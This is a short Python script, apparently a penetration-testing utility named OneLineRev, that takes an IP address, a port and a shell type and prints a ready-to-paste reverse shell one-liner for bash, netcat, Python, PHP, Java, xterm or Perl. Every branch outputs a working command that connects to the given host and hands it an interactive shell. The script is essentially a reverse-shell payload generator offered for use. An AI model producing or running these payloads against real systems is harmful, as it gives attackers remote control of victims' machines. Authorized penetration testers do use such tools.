#!/bin/python3

import sys

def banner():
    print("-"*15+" OneLineRev  "+"-"*15)
    print("\nReverse Shells From: Pentest Monkey")
    print("\nCreated By:(https://github.com/mrjoker05)\n")
    print("-"*43+"\n")

banner()

if(len(sys.argv) != 4):
    print("Usage: python3 rev.py <IP> <Port> <Type>\n")
    print("Types: Bash,Perl,Java,Python,Nc,PHP\n")
    print("Example: python3 OneLineRev.py 127.0.0.1 1337 bash\n")
    print("\n")
    sys.exit


else:
    script , ip , port , shell = sys.argv
    shell = shell.lower()

    if "bash" in shell:
        print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
        print("\n\n")

    elif "nc" in shell:
        print(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")
        print("\n\n")

    elif "python" in shell:
        print(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
        print("\n\n")

    elif "php" in shell:
        print(f'php -r \' $sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'')
        print("\n\n")

    elif "java" in shell:
        print(f'r = Runtime.getRuntime()\
        p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\
        p.waitFor()')
        print("\n\n")

    elif "xterm" in shell:
        print(f"xterm -display {ip}:1")
        print("\n\n")

    elif "perl" in shell:
        print('perl -e \'use Socket;$i="'+ip+'";$p='+port+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'')
        print("\n\n")

    else:
        print("Reverse shell type not found")
        print("\n\n")
